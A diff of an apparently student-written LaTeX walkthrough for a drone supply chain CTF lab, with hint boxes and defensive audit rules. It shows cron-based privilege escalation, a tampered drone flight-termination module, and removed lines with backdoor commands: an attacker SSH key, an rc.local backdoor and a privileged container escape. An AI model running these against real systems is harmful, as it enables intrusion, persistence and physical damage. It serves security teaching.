@@ -1,23 +1,43 @@
-\documentclass[11pt,a4paper]{article}
+\documentclass[12pt]{scrartcl}
+\usepackage[a4paper,margin=2.5cm]{geometry}
+\usepackage[hidelinks]{hyperref}
 \usepackage[utf8]{inputenc}
 \usepackage[T1]{fontenc}
-\usepackage{geometry}
 \usepackage{fancyhdr}
 \usepackage{graphicx}
 \usepackage{xcolor}
 \usepackage{listings}
-\usepackage{hyperref}
-\usepackage{tikz}
 \usepackage{amsmath}
 \usepackage{amsfonts}
 \usepackage{amssymb}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{enumitem}
+\usepackage{framed}
+\usepackage{setspace}
 
-\geometry{margin=2.5cm}
+% for the landscape diagram page
+\usepackage{pdflscape}
+
+% for the TikZ diagram
+\usepackage{tikz}
+\usetikzlibrary{positioning, arrows.meta, shapes, fit, calc}
+
+% Variablen definieren
+\newcommand{\faculty}{Faculty Applied Information Technology}
+\newcommand{\studies}{Bachelor of Cyber-Security}
+\newcommand{\thesistitleDE}{Damn Vulnerable Drone Supply Chain Compromise CTF - Technical Walkthrough}
+\newcommand{\submissiondate}{11.\ Mai 2025}
+\newcommand{\supervisor}{Prof.\ Dr.\ Michael Heigl}
 
 \definecolor{codegreen}{rgb}{0,0.6,0}
 \definecolor{codegray}{rgb}{0.5,0.5,0.5}
 \definecolor{codepurple}{rgb}{0.58,0,0.82}
 \definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{alertred}{rgb}{0.8,0.1,0.1}
+\definecolor{flagblue}{rgb}{0.1,0.3,0.8}
+\definecolor{hintgreen}{rgb}{0.1,0.7,0.2}
+\definecolor{warningorange}{rgb}{0.9,0.5,0.1}
 
 \lstdefinestyle{mystyle}{
     backgroundcolor=\color{backcolour},   
@@ -40,233 +60,470 @@
 
 \lstset{style=mystyle}
 
+% Custom environments for different types of content
+\newenvironment{flagbox}{%
+  \def\FrameCommand{\fboxsep=\FrameSep\colorbox{flagblue!20}}%
+  \MakeFramed {\advance\hsize-\width \FrameRestore}}%
+ {\endMakeFramed}
+
+\newenvironment{hintbox}{%
+  \def\FrameCommand{\fboxsep=\FrameSep\colorbox{hintgreen!20}}%
+  \MakeFramed {\advance\hsize-\width \FrameRestore}}%
+ {\endMakeFramed}
+
+\newenvironment{warningbox}{%
+  \def\FrameCommand{\fboxsep=\FrameSep\colorbox{warningorange!20}}%
+  \MakeFramed {\advance\hsize-\width \FrameRestore}}%
+ {\endMakeFramed}
+
+\newenvironment{storybox}{%
+  \def\FrameCommand{\fboxsep=\FrameSep\colorbox{gray!10}}%
+  \MakeFramed {\advance\hsize-\width \FrameRestore}}%
+ {\endMakeFramed}
+
+% Custom environment for challenge boxes
+\newenvironment{challengebox}[1]{%
+  \def\FrameCommand{\fboxsep=\FrameSep\colorbox{flagblue!10}}%
+  \MakeFramed{\advance\hsize-\width \FrameRestore}
+  \noindent\textbf{Challenge:} #1\\[0.5em]
+  \vspace{0.5em}
+  \begin{minipage}{0.95\linewidth}
+}{%
+  \\[1em]
+  \noindent\rule{\linewidth}{0.4pt}\\[2em] % Dedicated answer field
+  \end{minipage}
+  \endMakeFramed
+}
+
 \pagestyle{fancy}
 \fancyhf{}
-\rhead{Damn Vulnerable Drone}
-\lhead{Supply Chain Compromise CTF}
 \rfoot{Page \thepage}
 
 \begin{document}
 
-\title{\textbf{Damn Vulnerable Drone} \\ Supply Chain Compromise CTF \\ \large{Technical Walkthrough}}
-\author{Cybersecurity Education Platform}
-\date{\today}
+\begin{titlepage}
+  \begin{center}
+    {\Large Technische Hochschule Deggendorf\\
+    \faculty\par}
+    \vspace{0.2cm}
+    {\Large Studiengang \studies\\}
+    \vspace{2\baselineskip}
+    {\Huge\bfseries \thesistitleDE\par}
+    \vspace{3\baselineskip}
+  \end{center}
 
-\maketitle
+  \vfill
 
+  \parbox[t]{0.4\textwidth}{
+    \textbf{Vorgelegt von:}\\[0.5em]
+    Christof Renner\\
+    Matrikelnummer: 22301943\\
+    Manuel Friedl\\
+    Matrikelnummer: 1236626\\
+    Felix Hahl\\
+    Matrikelnummer:\\[1em]
+	\\
+    Am: \submissiondate\par
+  }
+  \hfill
+  \parbox[t]{0.4\textwidth}{
+    \textbf{Prüfungsleitung:}\\[0.5em]
+    \supervisor
+  }
+\end{titlepage}
+
+\cleardoublepage
 \tableofcontents
+\cleardoublepage
+
+\section{Welcome to Your First Hacking Lab!}
+
+\begin{storybox}
+\textbf{Your Mission Briefing}
+
+Welcome, future cybersecurity professional! You've just been hired as a junior penetration tester at SecureDrone Inc. Your first assignment? Test the security of a new drone development system that the company is building.
+
+The development team has been working on a cutting-edge drone platform, but management is concerned about security. They've heard scary stories about "supply chain attacks" in the news and want to make sure their system is bulletproof.
+
+Your job is to think like a hacker and try to break into their development environment. Don't worry - this is all legal and part of your job! The system has been specially designed for testing, so you can't hurt anything real.
+
+Are you ready to become a cybersecurity detective?
+\end{storybox}
+
+\subsection{What You'll Learn Today}
+
+By the end of this lab, you'll understand:
+\begin{itemize}
+    \item What a "supply chain attack" really means
+    \item How hackers use basic Linux commands to explore systems
+    \item Why developers sometimes make security mistakes
+    \item How to think like both an attacker and a defender
+    \item Real techniques used by professional security testers
+\end{itemize}
+
+\subsection{What is a Supply Chain Attack?}
+
+\begin{hintbox}
+\textbf{Supply Chain Attack Explained Simply}
+
+Imagine you're buying a sandwich from your favorite shop. You trust the shop, so you don't check if someone poisoned the ingredients before they arrived at the shop. A supply chain attack is like poisoning the ingredients at the supplier level - the shop owner doesn't know, and neither do the customers!
+
+In cybersecurity, this means hackers don't attack the final product directly. Instead, they sneak malicious code into the development process, so when the "clean" software gets installed, it's actually already compromised.
+
+Famous examples: SolarWinds (2020), Codecov (2021), and many npm packages.
+\end{hintbox}
+
 \newpage
 
-\section{Einführung}
+\section{Background: MITRE ATT\&CK Framework}
 
-Das \textbf{Damn Vulnerable Drone (DVD)} CTF-Szenario demonstriert einen realistischen Supply Chain Compromise, der verschiedene Phasen des MITRE ATT\&CK Frameworks abbildet. Dieses Dokument bietet eine detaillierte technische Anleitung zur Durchführung der Challenge.
+\begin{hintbox}
+\textbf{What is the MITRE ATT\&CK Framework?}
 
-\subsection{Überblick des Szenarios}
+The MITRE ATT\&CK Framework is a globally recognized knowledge base of cyberattack techniques and tactics. It helps security professionals understand how real-world attackers operate, map their activities, and improve defenses.
 
-Die Challenge simuliert eine Entwicklungsumgebung für Drohnensoftware, in der Teilnehmer:
+\textbf{Key Concepts:}
 \begin{itemize}
-    \item Zugriff auf eine niedrig privilegierte Entwicklermaschine erhalten
-    \item Schwachstellen in der Build-Pipeline ausnutzen
-    \item Eine Supply Chain Compromise durchführen
-    \item Kritische Drohneninfrastruktur kompromittieren
-    \item Eine Drohnensimulation zum Absturz bringen
+    \item \textbf{Tactics:} The attacker's goals (e.g., Initial Access, Persistence, Privilege Escalation)
+    \item \textbf{Techniques:} How those goals are achieved (e.g., Phishing, Exploiting Vulnerabilities, Scheduled Tasks)
+    \item \textbf{Procedures:} Real-world examples of how techniques are used
 \end{itemize}
 
-\subsection{Lernziele}
+In this lab, you'll see MITRE IDs (like T1078) that map your actions to real attacker behaviors!
+\end{hintbox}
 
-Nach Abschluss dieser Challenge verstehen die Teilnehmer:
+\begin{center}
+\begin{tikzpicture}[node distance=1.5cm, every node/.style={align=center}]
+  \node[draw, rounded corners, fill=flagblue!20, minimum width=2.5cm] (initial) {Initial Access};
+  \node[draw, rounded corners, fill=hintgreen!20, right=of initial] (persistence) {Persistence};
+  \node[draw, rounded corners, fill=warningorange!20, right=of persistence] (priv) {Privilege Escalation};
+  \node[draw, rounded corners, fill=gray!20, right=of priv] (impact) {Impact};
+  \draw[->, thick] (initial) -- (persistence);
+  \draw[->, thick] (persistence) -- (priv);
+  \draw[->, thick] (priv) -- (impact);
+\end{tikzpicture}
+
+\small{\textit{Figure: Example MITRE ATT\&CK Tactics Progression}}
+\end{center}
+
+\vspace{1em}
+
+\section{Background: What is Docker?}
+
+\begin{hintbox}
+\textbf{Docker in a Nutshell}
+
+Docker is a tool that lets you run applications in isolated environments called \textbf{containers}. Think of containers as lightweight, portable virtual computers that always work the same way, no matter where you run them.
+
+\textbf{Why use Docker?}
 \begin{itemize}
-    \item Wie Supply Chain Angriffe in Entwicklungsumgebungen durchgeführt werden
-    \item Die Ausnutzung von Cron-basierten Privilege Escalation Techniken
-    \item Die Manipulation von Build-Systemen und Deployment-Pipelines
-    \item Die realen Auswirkungen von kompromittierten Softwarekomponenten
+    \item Easy to set up complex labs and environments
+    \item Each container is separate and safe to experiment in
+    \item Used by real companies for development and deployment
 \end{itemize}
+\end{hintbox}
 
-\section{Systemarchitektur}
+\begin{center}
+\begin{tikzpicture}[node distance=2.5cm, every node/.style={align=center}]
+  \node[draw, rounded corners, fill=flagblue!20, minimum width=2.5cm] (host) {Host Machine};
+  \node[draw, rounded corners, fill=gray!10, below left=1.2cm and 1.5cm of host] (cont1) {Container 1\\(Developer)};
+  \node[draw, rounded corners, fill=gray!10, below=1.2cm of host] (cont2) {Container 2\\(GCS)};
+  \node[draw, rounded corners, fill=gray!10, below right=1.2cm and 1.5cm of host] (cont3) {Container 3\\(Drone)};
+  \draw[thick] (host) -- (cont1);
+  \draw[thick] (host) -- (cont2);
+  \draw[thick] (host) -- (cont3);
+\end{tikzpicture}
 
-\subsection{Container-Übersicht}
+\small{\textit{Figure: Docker Host Running Multiple Isolated Containers}}
+\end{center}
 
-Das DVD-System besteht aus drei Hauptkomponenten:
+\section{System Architecture}
+
+\subsection{Container Overview}
+
+The DVD system consists of three main components:
 
 \begin{enumerate}
     \item \textbf{Developer Machine} (\texttt{dev-workstation})
     \begin{itemize}
-        \item Niedrig privilegierter Entwicklerzugang
-        \item Build-Tools und Entwicklungsumgebung
-        \item Schwachstelle: Sudo-Zugriff auf \texttt{crontab}
+        \item Low privileged developer access
+        \item Build tools and development environment
+        \item Vulnerability: Sudo access to \texttt{crontab}
     \end{itemize}
     
     \item \textbf{Ground Control Station} (\texttt{ground-control})
     \begin{itemize}
-        \item Hauptsteuerungssystem für Drohnenoperationen
-        \item Überwacht gemeinsame Build-Artefakte
-        \item Deployment-Target für kompromittierte Software
+        \item Main control system for drone operations
+        \item Monitors shared build artifacts
+        \item Deployment target for compromised software
     \end{itemize}
     
     \item \textbf{Damn Vulnerable Drone} (\texttt{drone-01})
     \begin{itemize}
-        \item Drohnensimulation mit MAVLink-Protokoll
-        \item Führt Return-to-Land (RTL) Operationen aus
-        \item Ziel der Supply Chain Compromise
+        \item Drone simulation with MAVLink protocol
+        \item Executes Return-to-Land (RTL) operations
+        \item Target of the supply chain compromise
     \end{itemize}
 \end{enumerate}
 
-\subsection{Netzwerktopologie}
+\subsection{Network Topology}
 
 \begin{figure}[h]
 \centering
-\begin{tikzpicture}[node distance=3cm]
-    % Define nodes
-    \node[draw, rectangle, minimum width=3cm, minimum height=1.5cm] (dev) {Developer\\Machine\\(172.20.0.2)};
-    \node[draw, rectangle, minimum width=3cm, minimum height=1.5cm, right of=dev] (gcs) {Ground Control\\Station\\(172.20.0.3)};
-    \node[draw, rectangle, minimum width=3cm, minimum height=1.5cm, right of=gcs] (drone) {Drone\\Simulation\\(172.20.0.4)};
-    
-    % Define connections
-    \draw[<->] (dev) -- (gcs) node[midway, above] {Shared Builds};
-    \draw[<->] (gcs) -- (drone) node[midway, above] {MAVLink};
-    \draw[<->, dashed] (dev) -- (drone) node[midway, below] {Network Access};
+\begin{tikzpicture}[node distance=3cm, every node/.style={align=center}]
+    % Nodes
+    \node[draw, rectangle, minimum width=3cm, minimum height=1.5cm] (dev) {Developer Machine\\(172.20.0.2)};
+    \node[draw, rectangle, minimum width=3cm, minimum height=1.5cm, right=of dev] (gcs) {Ground Control Station\\(172.20.0.3)};
+    \node[draw, rectangle, minimum width=3cm, minimum height=1.5cm, right=of gcs] (drone) {Drone Simulation\\(172.20.0.4)};
+    % Connections
+    \draw[<->, thick] (dev) -- node[above]{Shared Builds} (gcs);
+    \draw[<->, thick] (gcs) -- node[above]{MAVLink} (drone);
+    \draw[<->, dashed, thick] (dev) to[bend right=30] node[below]{Network Access} (drone);
 \end{tikzpicture}
-\caption{DVD Netzwerkarchitektur}
+\caption{DVD Network Architecture}
 \end{figure}
+
+\newpage
+
+\section{Lab Setup - Getting Started}
+
+\subsection{Starting Your Hacking Environment}
+
+First, let's get our lab environment running. Don't worry about understanding every detail right now - we'll explain as we go!
+
+\begin{lstlisting}[language=bash, caption=Starting the Lab Environment]
+# Open a terminal and navigate to the lab directory
+cd /path/to/Damn-Vulnerable-Drone/DVDS-SUPPLYCHAIN-CHALLENGE
+
+# Start all the lab computers (containers)
+docker-compose up -d --build
+
+# Check that everything is running
+docker ps
+\end{lstlisting}
+
+\begin{hintbox}
+\textbf{What just happened?}
+
+We just started several "virtual computers" (called containers) that simulate a real company's development environment:
+\begin{itemize}
+    \item A developer's workstation (where programmers write code)
+    \item A ground control station (where drone operators work)
+    \item A simulated drone (for testing)
+\end{itemize}
+
+Think of it like a miniature version of a real company's IT infrastructure!
+\end{hintbox}
+
+\subsection{Your First Connection}
+
+Now let's connect to the developer's computer and start exploring:
+
+\begin{lstlisting}[language=bash, caption=Connecting to the Developer Machine]
+# Connect to the developer's workstation
+docker exec -it dvd-developer-machine /bin/bash
+
+# You should see a command prompt that looks like:
+# root@developer-machine:/#
+\end{lstlisting}
+
+\begin{challengebox}{What user directories can you find on the system?}
+List the user directories you discover
+
+\noindent\rule{\linewidth}{0.4pt}\\[2em]
+\end{challengebox}
+
+\newpage
 
 \section{Phase 1: Initial Access}
 
 \subsection{MITRE ATT\&CK Mapping}
-\textbf{Technik:} T1078 - Valid Accounts
+\textbf{Technique:} T1078 - Valid Accounts
 
-\subsection{Zugriff auf die Entwicklermaschine}
+\subsection{Gaining Access to the Developer Machine}
 
-Der erste Schritt besteht darin, Zugang zur Entwicklerumgebung zu erlangen:
+The first step is to gain access to the development environment:
 
-\begin{lstlisting}[language=bash, caption=Containerstart und Zugriff]
-# Starten des gesamten DVD-Systems
+\begin{lstlisting}[language=bash, caption=Starting Container and Access]
+# Start the entire DVD system
 docker-compose up -d
 
-# Verbindung zur Entwicklermaschine
+# Connect to the developer machine
 docker exec -it dvd-developer-machine /bin/bash
 
-# Anmeldung als Developer
+# Log in as developer
 su - developer
-# Passwort: dev123
+# Password: dev123
 \end{lstlisting}
 
-\subsection{Initiale Systemerkundung}
+\subsection{Initial System Reconnaissance}
 
-Nach erfolgreicher Anmeldung sollten folgende Schritte durchgeführt werden:
+After successful login, perform the following exploration steps:
 
-\begin{lstlisting}[language=bash, caption=Grundlegende Systemerkundung]
-# Aktuelles Verzeichnis und Benutzerkontext
+\begin{lstlisting}[language=bash, caption=Basic System Reconnaissance]
+# Current directory and user context
 pwd
 whoami
 id
 
-# Verfügbare Netzwerkverbindungen
+# Available network connections
 ping -c 3 ground-control
 ping -c 3 drone-01
 
-# Überprüfung der Netzwerkkonfiguration
+# Check network configuration
 ip addr show
 route -n
 \end{lstlisting}
 
+\newpage
+
 \section{Phase 2: Discovery}
 
 \subsection{MITRE ATT\&CK Mapping}
-\textbf{Technik:} T1083 - File and Directory Discovery
+\textbf{Technique:} T1083 - File and Directory Discovery
 
-\subsection{Dokumentationsanalyse}
+\subsection{Documentation Analysis}
 
-Untersuchen Sie die verfügbaren Dokumentationen:
+Examine the available documentation:
 
-\begin{lstlisting}[language=bash, caption=Dokumentationsreview]
-# Navigation zum Dokumentationsverzeichnis
+\begin{lstlisting}[language=bash, caption=Documentation Review]
+# Navigate to documentation directory
 cd /home/developer/Documents/
 
-# Lesen der verfügbaren Hinweise
+# Read available hints
 cat README.txt
 cat known_issues.txt
 
-# Exploration der Projektverzeichnisse
+# Explore project directories
 ls -la /home/developer/projects/
 python3 /home/developer/projects/drone_dev.py
 \end{lstlisting}
 
-\subsection{Build-System-Analyse}
+\subsection{Build System Analysis}
 
-Identifizierung des Build-Systems und potenzieller Angriffsvektoren:
+Identify the build system and potential attack vectors:
 
-\begin{lstlisting}[language=bash, caption=Build-System-Erkundung]
-# Untersuchung des /opt/ Verzeichnisses
+\begin{lstlisting}[language=bash, caption=Build System Exploration]
+# Examine the /opt/ directory
 ls -la /opt/
 ls -la /opt/shared-builds/
 
-# Analyse des Build-Update-Skripts
+# Analyze the build update script
 cat /opt/build-update.sh
 
-# Überprüfung der aktuellen RTL-Implementierung
+# Check current RTL implementation
 cat /opt/shared-builds/return-to-land.py
 \end{lstlisting}
 
-\subsection{Privilege-Analyse}
+\subsection{Privilege Analysis}
 
-Ermittlung verfügbarer Privilegien und Schwachstellen:
+Determine available privileges and vulnerabilities:
 
-\begin{lstlisting}[language=bash, caption=Privilege-Enumeration]
-# Überprüfung der sudo-Berechtigungen
+\begin{lstlisting}[language=bash, caption=Privilege Enumeration]
+# Check sudo permissions
 sudo -l
 
-# Analyse der Cron-Konfiguration
-crontab -l 2>/dev/null || echo "Keine Cron-Jobs konfiguriert"
+# Analyze cron configuration
+crontab -l 2>/dev/null || echo "No cron jobs configured"
 
-# Systembenutzer und Gruppen
+# System users and groups
 groups
 cat /etc/passwd | grep developer
 \end{lstlisting}
 
-\section{Phase 3: Privilege Escalation}
+\section{Phase 3 - Finding Our Attack Vector}
 
 \subsection{MITRE ATT\&CK Mapping}
-\textbf{Technik:} T1053.003 - Scheduled Task/Job: Cron
+\textbf{Technique:} T1053.003 - Scheduled Task/Job: Cron
 
-\subsection{Cron-basierte Privilege Escalation}
+\subsection{The Privilege Escalation Hunt}
 
-Die kritische Schwachstelle liegt in der sudo-Berechtigung für \texttt{crontab}:
+We found the build script, but it's owned by root. We need to find a way to modify it. Let's check what special privileges our developer account has:
 
-\begin{lstlisting}[language=bash, caption=Cron-Job-Konfiguration]
-# Erstellen eines malicious Cron-Jobs
+\begin{lstlisting}[language=bash, caption=Checking Privileges]
+# Check what commands we can run as root
+sudo -l
+
+# Look for scheduled tasks (cron jobs)
+crontab -l
+
+# Check if there are any system-wide cron jobs
+ls -la /etc/cron*
+cat /etc/crontab
+\end{lstlisting}
+
+\begin{hintbox}
+\textbf{What is sudo?}
+
+\texttt{sudo} stands for "Super User DO". It allows regular users to run specific commands as the root (administrator) user. 
+
+When you run \texttt{sudo -l}, you're asking: "What am I allowed to do as root?"
+
+If a system is misconfigured, you might find that you can run dangerous commands as root, even from a regular user account!
+\end{hintbox}
+
+\begin{challengebox}{Privilege Discovery}
+When you run \texttt{sudo -l} and find that you can run some commands without a password (look for "NOPASSWD"), you've found a critical security vulnerability! Write down the flag below:
+
+\texttt{FOUND\_SUDO\_PRIVILEGES}
+
+\noindent\rule{\linewidth}{0.4pt}\\[2em]
+\end{challengebox}
+
+\subsection{Understanding Cron Jobs}
+
+Cron is like a robot assistant that runs commands automatically on a schedule:
+
+\begin{lstlisting}[language=bash, caption=Setting Up Malicious Cron Job]
+# Create a malicious cron job to trigger our supply chain attack
 sudo crontab -e
 
-# Fügen Sie folgende Zeile hinzu:
+# Add this line to run the build script every 2 minutes:
 # */2 * * * * /opt/build-update.sh
 
-# Verifikation der Cron-Job-Installation
+# Verify the cron job was installed
 sudo crontab -l
 \end{lstlisting}
 
-\textbf{Erklärung:} Dieser Cron-Job wird alle 2 Minuten als root ausgeführt und führt das Build-Update-Skript aus, welches die legitime RTL-Komponente mit einer kompromittierten Version ersetzt.
+\begin{hintbox}
+\textbf{How to Read Cron Syntax}
 
-\subsection{Monitoring der Compromise}
+A cron job looks like: \texttt{*/2 * * * * /opt/build-update.sh}
 
-Überwachung des Supply Chain Compromise-Prozesses:
+The five stars represent:
+\begin{itemize}
+    \item \texttt{*/2} = every 2 minutes
+    \item \texttt{*} = every hour
+    \item \texttt{*} = every day of month
+    \item \texttt{*} = every month
+    \item \texttt{*} = every day of week
+\end{itemize}
 
-\begin{lstlisting}[language=bash, caption=Kompromittierungs-Monitoring]
-# Kontinuierliche Überwachung der RTL-Datei
+So \texttt{*/2 * * * *} means "every 2 minutes"!
+\end{hintbox}
+
+\subsection{Monitoring the Compromise Process}
+
+Watch as our supply chain attack unfolds:
+
+\begin{lstlisting}[language=bash, caption=Monitoring the Attack]
+# Watch the RTL file for changes
 watch -n 10 "ls -la /opt/shared-builds/return-to-land.py && echo '---' && head -10 /opt/shared-builds/return-to-land.py"
 
-# Alternative: Systemlog-Monitoring
+# Alternative: Monitor system logs
 tail -f /var/log/syslog | grep CRON
 \end{lstlisting}
 
 \section{Phase 4: Supply Chain Compromise}
 
 \subsection{MITRE ATT\&CK Mapping}
-\textbf{Technik:} T1195.002 - Compromise Software Supply Chain
+\textbf{Technique:} T1195.002 - Compromise Software Supply Chain
 
-\subsection{Analyse der kompromittierten Komponente}
+\subsection{Analysis of the Compromised Component}
 
-Nach der automatischen Ausführung des Cron-Jobs wird die RTL-Komponente ersetzt:
+After the cron job executes automatically, the RTL component gets replaced:
 
-\begin{lstlisting}[language=python, caption=Kompromittierte RTL-Implementierung]
+\begin{lstlisting}[language=python, caption=Compromised RTL Implementation]
 def send_flight_termination_command(master):
     """Send flight termination command to force the drone 
        to shut down in mid-air."""
@@ -281,38 +538,61 @@ def send_flight_termination_command(master):
     print("CRITICAL: Flight termination command sent")
 \end{lstlisting}
 
-\subsection{Deployment-Verifikation}
+\begin{warningbox}
+\textbf{Understanding the Attack}
 
-Überprüfung der erfolgreichen Kompromittierung:
+What just happened is the core of a supply chain attack:
+\begin{enumerate}
+    \item We used legitimate access (developer account)
+    \item We exploited a misconfiguration (sudo crontab access)
+    \item We scheduled malicious code to be deployed automatically
+    \item The build system now deploys compromised software every 2 minutes
+    \item Anyone using the "updated" software will run our malicious code
+\end{enumerate}
 
-\begin{lstlisting}[language=bash, caption=Deployment-Verifikation]
-# Überprüfung der modifizierten RTL-Datei
+This is exactly how real-world supply chain attacks work!
+\end{warningbox}
+
+\subsection{Deployment Verification}
+
+Verify the successful compromise:
+
+\begin{lstlisting}[language=bash, caption=Deployment Verification]
+# Check the modified RTL file
 cat /opt/shared-builds/return-to-land.py | grep -A 5 "flight_termination"
 
-# Verifikation der Deployment-Logs im Ground Control System
+# Verify deployment logs in Ground Control System
 docker logs dvd-ground-control | grep "RTL module"
 \end{lstlisting}
+
+\begin{challengebox}{Supply Chain Compromise}
+When you see the malicious flight termination code in the RTL file, you've successfully compromised the supply chain! Write down the flag below:
+
+\texttt{SUPPLY\_CHAIN\_COMPROMISED}
+
+\noindent\rule{\linewidth}{0.4pt}\\[2em]
+\end{challengebox}
 
 \section{Phase 5: Impact}
 
 \subsection{MITRE ATT\&CK Mapping}
-\textbf{Technik:} T1485 - Data Destruction
+\textbf{Technique:} T1485 - Data Destruction
 
-\subsection{Drohnen-Crash-Simulation}
+\subsection{Drone Crash Simulation}
 
-Ausführung der kompromittierten RTL-Komponente:
+Execute the compromised RTL component to demonstrate impact:
 
-\begin{lstlisting}[language=bash, caption=RTL-Ausführung und Crash-Simulation]
-# Direkte Ausführung der kompromittierten RTL
+\begin{lstlisting}[language=bash, caption=RTL Execution and Crash Simulation]
+# Direct execution of the compromised RTL
 python3 /opt/shared-builds/return-to-land.py
 
-# Alternative: Über das Ground Control System
+# Alternative: Via the Ground Control System
 docker exec -it dvd-ground-control python3 /return-to-land.py
 \end{lstlisting}
 
-\subsection{Flag-Extraktion}
+\subsection{Flag Extraction}
 
-Bei erfolgreichem Crash wird die Flag angezeigt:
+Upon successful crash, the flag is displayed:
 
 \begin{verbatim}
 Connected to drone via ground control
@@ -321,137 +601,321 @@ CRITICAL: Flight termination command sent - simulating crash
 [DRONE CRASHED] Root Flag: DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}
 \end{verbatim}
 
-\section{Defensive Maßnahmen}
+\begin{challengebox}{Mission Complete}
+When you see the drone crash message with the root flag, you've completed the entire supply chain attack! Write down the final flag below:
 
-\subsection{Präventive Kontrollen}
+\texttt{DVD\{supply\_ch41n\_c0mpr0m153\_1s\_r34l\_7hr347\}}
 
-\subsubsection{Principle of Least Privilege}
+\noindent\rule{\linewidth}{0.4pt}\\[2em]
+\end{challengebox}
+
+\section{Defense and Mitigation}
+
+\subsection{How to Prevent Supply Chain Attacks}
+
+Now that you understand how these attacks work, let's learn how to defend against them:
+
+\begin{warningbox}
+\textbf{Security Best Practices}
+
+\textbf{1. Strong Authentication}
 \begin{itemize}
-    \item Minimierung der sudo-Berechtigungen für Entwicklerkonten
-    \item Implementierung von Just-in-Time (JIT) Access
-    \item Regelmäßige Überprüfung und Audit von Berechtigungen
+    \item Use strong, unique passwords
+    \item Implement multi-factor authentication
+    \item Regular password rotation
 \end{itemize}
 
-\subsubsection{Supply Chain Security}
-\begin{lstlisting}[language=bash, caption=Code-Integrity-Monitoring]
-# AIDE für File Integrity Monitoring
+\textbf{2. Privilege Management}
+\begin{itemize}
+    \item Follow principle of least privilege
+    \item Remove unnecessary sudo permissions
+    \item Audit privileged access regularly
+\end{itemize}
+
+\textbf{3. Build System Security}
+\begin{itemize}
+    \item Code signing and verification
+    \item Isolated build environments
+    \item Automated security scanning
+    \item Change monitoring and approval processes
+\end{itemize}
+
+\textbf{4. Monitoring and Detection}
+\begin{itemize}
+    \item File integrity monitoring
+    \item Continuous security monitoring
+    \item Anomaly detection
+    \item Regular security audits
+\end{itemize}
+\end{warningbox}
+
+\subsection{Implementing Basic Defenses}
+
+Let's implement some basic security measures:
+
+\begin{lstlisting}[language=bash, caption=Basic Security Hardening]
+# Remove dangerous sudo permissions
+sudo visudo
+# Remove or comment out the NOPASSWD line
+
+# Set up file integrity monitoring
 sudo apt-get install aide
 sudo aide --init
-sudo aide --check
 
-# Git-Hook für Code-Signierung
-git config --global commit.gpgsign true
-git config --global user.signingkey YOUR_GPG_KEY
+# Monitor critical files
+sudo auditctl -w /bin/build-update.sh -p wa -k build_script_changes
+sudo auditctl -w /opt/shared-builds/ -p wa -k shared_builds_changes
+
+# Check for unusual cron jobs
+sudo crontab -l
+ls -la /etc/cron.d/
 \end{lstlisting}
 
-\subsection{Detective Kontrollen}
+\section{Real-World Context}
 
-\subsubsection{Kontinuierliches Monitoring}
-\begin{lstlisting}[language=bash, caption=Monitoring-Implementierung]
-# Auditd für Systemüberwachung
-sudo auditctl -w /etc/crontab -p wa -k cron_changes
-sudo auditctl -w /opt/ -p wa -k build_changes
+\subsection{Famous Supply Chain Attacks}
 
-# Process-Monitoring
-sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_monitor
-\end{lstlisting}
+Your lab exercise was based on real attack techniques used in major cybersecurity incidents:
 
-\subsubsection{Log-Analyse}
+\begin{longtable}{|p{3cm}|p{4cm}|p{6cm}|}
+\caption{Major Supply Chain Attacks} \\
+\hline
+\textbf{Attack} & \textbf{Year} & \textbf{Description} \\
+\hline
+\endfirsthead
+\hline
+\textbf{Attack} & \textbf{Year} & \textbf{Description} \\
+\hline
+\endhead
+\hline
+\endfoot
+\hline
+\endlastfoot
+
+SolarWinds & 2020 & Hackers injected malicious code into SolarWinds' software updates, affecting thousands of organizations including government agencies \\
+\hline
+Codecov & 2021 & Hackers modified a bash script in Codecov's CI/CD pipeline, stealing credentials from hundreds of customer networks \\
+\hline
+CCleaner & 2017 & Malware was inserted into the popular CCleaner software, affecting over 2 million users \\
+\hline
+NotPetya & 2017 & Attackers compromised a Ukrainian software company's update mechanism to spread destructive malware globally \\
+\hline
+\end{longtable}
+
+\subsection{Career Paths in Cybersecurity}
+
+Completing this lab shows you have aptitude for several cybersecurity careers:
+
 \begin{itemize}
-    \item Zentralisierte Log-Sammlung mit ELK Stack
-    \item Anomalie-Erkennung für Build-Prozesse
-    \item Alerting bei unautorisierten Cron-Job-Änderungen
+    \item \textbf{Penetration Tester}: Test systems for vulnerabilities (like you just did!)
+    \item \textbf{Security Analyst}: Monitor and respond to security threats
+    \item \textbf{DevSecOps Engineer}: Build security into development processes
+    \item \textbf{Incident Response Specialist}: Investigate and contain cyber attacks
+    \item \textbf{Security Architect}: Design secure systems and infrastructure
 \end{itemize}
 
-\section{Erweiterte Angriffsvektoren}
+\section{Next Steps}
 
-\subsection{Persistenz-Mechanismen}
+\subsection{Continue Learning}
 
-Alternative Methoden zur Aufrechterhaltung des Zugriffs:
+\begin{hintbox}
+\textbf{Recommended Learning Path}
 
-\begin{lstlisting}[language=bash, caption=Persistenz-Techniken]
-# SSH-Key-Implantation
-echo "ssh-rsa AAAAB3... attacker@evil.com" >> ~/.ssh/authorized_keys
+\textbf{Immediate Next Steps:}
+\begin{itemize}
+    \item Practice more Linux command line skills
+    \item Learn about the MITRE ATT\&CK framework
+    \item Study common vulnerabilities (OWASP Top 10)
+    \item Try other hands-on labs (TryHackMe, HackTheBox)
+\end{itemize}
 
-# Systemd-Service-Erstellung
-sudo systemctl enable malicious-service
-sudo systemctl start malicious-service
+\textbf{Intermediate Goals:}
+\begin{itemize}
+    \item Learn a scripting language (Python, Bash)
+    \item Study network security fundamentals
+    \item Practice with vulnerability scanners
+    \item Understand cryptography basics
+\end{itemize}
 
-# Init-Script-Modifikation
-echo "/opt/backdoor.sh &" >> /etc/rc.local
-\end{lstlisting}
+\textbf{Advanced Skills:}
+\begin{itemize}
+    \item Reverse engineering and malware analysis
+    \item Cloud security (AWS, Azure, GCP)
+    \item Advanced persistent threat (APT) analysis
+    \item Security tool development
+\end{itemize}
+\end{hintbox}
 
-\subsection{Lateral Movement}
+\subsection{Certification Pathways}
 
-Bewegung innerhalb der DVD-Infrastruktur:
-
-\begin{lstlisting}[language=bash, caption=Lateral Movement]
-# Container-Escape-Techniken
-docker run --rm -it --pid host --net host --privileged \
-  -v /:/host ubuntu chroot /host
-
-# Network-Discovery
-nmap -sn 172.20.0.0/16
